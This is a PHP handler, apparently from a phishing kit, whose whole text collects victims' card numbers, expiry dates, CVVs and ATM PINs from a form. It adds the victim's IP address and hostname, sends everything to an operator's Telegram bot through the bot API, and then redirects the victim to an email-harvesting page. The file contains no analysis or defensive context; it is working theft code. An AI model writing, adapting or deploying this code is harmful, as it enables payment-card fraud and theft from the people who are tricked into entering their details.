<?php
session_start();
include "../config.php";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "💳 𝙲𝙲 𝙸𝚗𝚏𝚘𝚛𝚖𝚊𝚝𝚒𝚘𝚗𝚜 💳\n";
$msg .= "\n";
$msg .= "𝙲𝚊𝚛𝚍 𝙽𝚞𝚖𝚋𝚎𝚛: ".$_POST['cardnumber']."\n";
$msg .= "𝙴𝚡𝚙 𝙳𝚊𝚝𝚎: ".$_POST['expdate']."\n";
$msg .= "𝙲𝚅𝚅: ".$_POST['cvv']."\n";
$msg .= "𝙰𝚃𝙼 𝙿𝚒𝚗: ".$_POST['atmpin']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName : ".$hostname."\n";


file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );


header("Location: email.php");  	  
?>


